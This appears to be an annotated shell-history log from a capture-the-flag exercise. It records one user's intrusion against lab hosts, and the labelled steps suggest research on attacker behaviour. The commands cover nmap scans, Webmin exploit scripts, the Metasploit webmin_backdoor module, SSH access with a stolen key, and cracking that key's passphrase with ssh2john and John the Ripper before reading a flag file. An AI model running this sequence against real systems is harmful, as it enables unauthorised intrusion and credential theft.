User 70 start time 1594797796 end 1594805174
PADDING
PADDING
PADDING
INPUT|70--0|M0 |1594797796|70|nmap 172.18.1.5|OUTPUT
INPUT|70--1|A1 |1594797888|70|nmap 172.18.1.5 -p 10000|OUTPUT
INPUT|70--2|U|1594798425|70|J8 cd Downloads/|OUTPUT
INPUT|70--3|A10 |1594798431|70|ls|OUTPUT
INPUT|70--4|U|1594798436|70|cd Downloads/|OUTPUT
INPUT|70--5|A10 |1594798438|70|ls|OUTPUT
INPUT|70--6|U|1594798465|70|sh 47293.sh 172.18.1.5:10000|OUTPUT
INPUT|70--7|U|1594798492|70|bash 47293.sh 172.18.1.5:10000|OUTPUT
INPUT|70--8|U|1594798577|70|nano utok.sh|OUTPUT
INPUT|70--9|U|1594798654|70|sh utok.sh 172.18.1.5:10000|OUTPUT
INPUT|70--10|U|1594798689|70|nano utok.sh|OUTPUT
INPUT|70--11|M2 |1594798841|70|msfconsole|OUTPUT
INPUT|70--12|U|1594799047|70|exit|OUTPUT
INPUT|70--13|U|1594799191|70|msfconsole|OUTPUT
INPUT|70--14|M4 |1594799257|70|use unix/webapp/webmin_backdoor|OUTPUT
INPUT|70--15|U|1594799272|70|help|OUTPUT
INPUT|70--16|M5 |1594799391|70|show options|OUTPUT
INPUT|70--17|M6 |1594799450|70|set RHOSTS 172.18.1.5|OUTPUT
INPUT|70--18|M8 |1594799475|70|exploit|OUTPUT
INPUT|70--19|U|1594799498|70|ip a|OUTPUT
INPUT|70--20|U|1594799546|70|set LHOST 192.168.131.85|OUTPUT
INPUT|70--21|U|1594799854|70|exploit|OUTPUT
INPUT|70--22|U|1594800496|70|exit|OUTPUT
INPUT|70--23|U|1594800505|70|quit|OUTPUT
INPUT|70--24|U|1594800513|70|exit -y|OUTPUT
INPUT|70--25|U|1594800516|70|clear|OUTPUT
INPUT|70--26|U|1594800554|70|namp 172.18.1.1/24|OUTPUT
INPUT|70--27|A1 |1594800563|70|nmap 172.18.1.1/24|OUTPUT
INPUT|70--28|A1 |1594800633|70|nmap 10.0.1.1/24|OUTPUT
INPUT|70--29|A1 |1594800710|70|nmap 10.1.0.1/24|OUTPUT
INPUT|70--30|A1 |1594800759|70|nmap 100.100.100.1/24|OUTPUT
INPUT|70--31|U|1594800827|70|msfconsole|OUTPUT
INPUT|70--32|U|1594800857|70|use unix/webapp/webmin_backdoor|OUTPUT
INPUT|70--33|U|1594800877|70|set LHOST 192.168.131.85|OUTPUT
INPUT|70--34|A1 |1594800947|70|nmap 172.168.1.1/24|OUTPUT
INPUT|70--35|A1 |1594800961|70|nmap 172.18.1.1/24|OUTPUT
INPUT|70--36|U|1594801046|70|set RHOSTS 172.18.1.5|OUTPUT
INPUT|70--37|A1 |1594801245|70|nmap 10.1.0.1/24|OUTPUT
INPUT|70--38|U|1594801365|70|exploit|OUTPUT
INPUT|70--39|U|1594802673|70|show options|OUTPUT
INPUT|70--40|U|1594802771|70|curl 172.18.1.5:10000|OUTPUT
INPUT|70--41|U|1594802720|70|exploit|OUTPUT
INPUT|70--42|U|1594803384|70|clear|OUTPUT
INPUT|70--43|A1 |1594803391|70|nmap 10.1.17.4|OUTPUT
INPUT|70--44|U|1594803553|70|nano key.txt|OUTPUT
INPUT|70--45|M15 |1594803568|70|chmod 600 key.txt|OUTPUT
INPUT|70--46|M16 |1594803592|70|ssh -i key.txt eve@10.1.17.4|OUTPUT
INPUT|70--47|U|1594803754|70|ssh -i key.txt eve@10.1.17.4|OUTPUT
INPUT|70--48|U|1594803865|70|ssh -i key.txt eve@10.1.17.4|OUTPUT
INPUT|70--49|A10 |1594804076|70|ls|OUTPUT
INPUT|70--50|A14 |1594804107|70|./ssh2john.py|OUTPUT
INPUT|70--51|A14 |1594804113|70|./ssh2john.py key.txt|OUTPUT
INPUT|70--52|A14 |1594804193|70|./ssh2john.py key.txt > sshjohn.txt|OUTPUT
INPUT|70--53|A10 |1594804218|70|ls|OUTPUT
INPUT|70--54|A14 |1594804248|70|man john|OUTPUT
INPUT|70--55|A14 |1594804304|70|john --single sshjohn.txt|OUTPUT
INPUT|70--56|A14 |1594804329|70|john --show sshjohn.txt|OUTPUT
INPUT|70--57|A14 |1594804339|70|john --single sshjohn.txt|OUTPUT
INPUT|70--58|A14 |1594804356|70|john --show sshjohn.txt|OUTPUT
INPUT|70--59|A14 |1594804406|70|john -i sshjohn.txt|OUTPUT
INPUT|70--60|A14 |1594804439|70|john --incremental sshjohn.txt|OUTPUT
INPUT|70--61|A10 |1594804755|70|ls|OUTPUT
INPUT|70--62|U|1594804923|70|gunzip /usr/share/wordlists/rockyou.txt.gz|OUTPUT
INPUT|70--63|U|1594804951|70|clear|OUTPUT
INPUT|70--64|M14 |1594804983|70|john --wordlist /usr/share/wordlists/rockyou.txt sshjohn.txt|OUTPUT
INPUT|70--65|U|1594805048|70|ssh -i key.txt eve@10.1.17.4|OUTPUT
INPUT|70--66|U|1594805074|70|ssh -i key.txt eve@10.1.17.4|OUTPUT
INPUT|70--67|A10 |1594805166|70|ls|OUTPUT
INPUT|70--68|U|1594805170|70|cd top-secret/|OUTPUT
INPUT|70--69|A10 |1594805170|70|ls|OUTPUT
INPUT|70--70|M17 |1594805174|70|cat flag.txt|OUTPUT
